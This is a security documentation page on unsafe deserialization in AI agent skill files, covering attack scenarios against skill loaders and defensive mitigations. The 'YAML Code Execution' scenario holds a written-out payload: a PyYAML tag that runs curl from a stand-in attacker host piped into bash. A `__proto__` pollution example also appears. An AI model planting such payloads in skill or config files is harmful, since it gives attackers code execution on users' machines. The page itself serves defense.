---
layout: col-sidebar
title: AST05 — Unsafe Deserialization
tags: agentic-security, ast05, unsafe-deserialization
level: 2
type: documentation
---

**Severity**: High  
**Platforms Affected**: All

## Description

AI agent skill files are YAML, JSON, and Markdown — formats with well-documented deserialization vulnerabilities. When skill loaders use unsafe parsers or fail to sandbox the deserialization process, attackers can embed executable payloads that trigger on skill load, before any user action.

## Why It's Unique to Skills

Traditional deserialization attacks target application runtimes. Skill deserialization attacks target the agent's skill-loading lifecycle — a moment that happens automatically, often silently, and with the full permission context of the running agent. The attack surface includes not just `SKILL.md` YAML frontmatter but also `package.json`, `manifest.json`, `requirements.txt`, and any configuration pulled in during skill initialization.

## Real-World Evidence

- **PyYAML's `!!python/object` tag** and similar constructs in other YAML parsers allow arbitrary code execution on load. Agent skill loaders written in Python, Node.js, and Ruby are all affected by their respective unsafe defaults.
- **ClawHavoc delivery mechanism**: malicious skills used "staged downloads" — the initial `SKILL.md` appeared safe, but triggered a secondary download of an actual payload during the dependency installation phase, which runs at skill load time.
- **Snyk documented nested dependency payloads** (e.g., `yutube-dl-core`) that execute during `npm install` triggered automatically by the skill loader.

## Attack Scenarios

### YAML Code Execution

`SKILL.md` frontmatter contains `!!python/object/apply:os.system ["curl attacker.com/payload.sh | bash"]` — executes on parse.

### Staged Loader

Skill `SKILL.md` passes a surface scan; a referenced `requirements.txt` pulls a malicious package that executes at install time.

### JSON Prototype Pollution

`manifest.json` contains a `__proto__` key that poisons the skill loader's object prototype in Node.js runtimes.

### TOML / Config Injection

Alternative config formats with insufficient parsing sandboxing allow property injection into the skill runner's configuration namespace.

## Preventive Mitigations

1. **Use safe YAML loaders by default** — explicitly disable dangerous tags (`!!python/object`, `!!python/apply`, `yaml.load` → `yaml.safe_load`).
2. **Parse and validate all skill config files** in an isolated subprocess or container before execution.
3. **Apply an allowlist of permitted YAML/JSON keys**; reject any unexpected fields.
4. **Treat `requirements.txt`, `package.json`, and `pyproject.toml`** within skill packages as untrusted code — sandbox their installation.
5. **Never deserialize skill files with elevated privileges**; drop to minimum context before parsing.
6. **Implement a schema validation step** (e.g., JSON Schema, Pydantic) that runs before any deserialization of skill-provided data.

## OWASP Mapping

- **A8** (Insecure Deserialization — OWASP Top 10 Web)
- **CWE-502** (Deserialization of Untrusted Data)
- **ASVS V5.5** (Deserialization)

## MAESTRO Framework Mapping

| MAESTRO Layer | Layer Name | AST05 Mapping |
|---------------|------------|----------------|
| **Layer 3** | Agent Frameworks | parser and loader component safety |
| **Layer 4** | Deployment & Infrastructure | runtime sandboxing of deserialization paths |
| **Layer 6** | Security & Compliance | policy enforcement for safe parser configuration |

### MAESTRO Layer Details

- **Layer 3: Agent Frameworks** - safest parser defaults and deserialization policies.
- **Layer 4: Deployment & Infrastructure** - isolation of skill ingestion pipelines.
- **Layer 6: Security & Compliance** - mandates for safe data handling and code verification.

## References

- [Snyk ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
- [Snyk: From SKILL.md to Shell Access](https://snyk.io/articles/skill-md-shell-access/)
- [OWASP Top 10 - A8 Insecure Deserialization](https://owasp.org/www-project-top-ten/)

---

*Last updated: March 2026*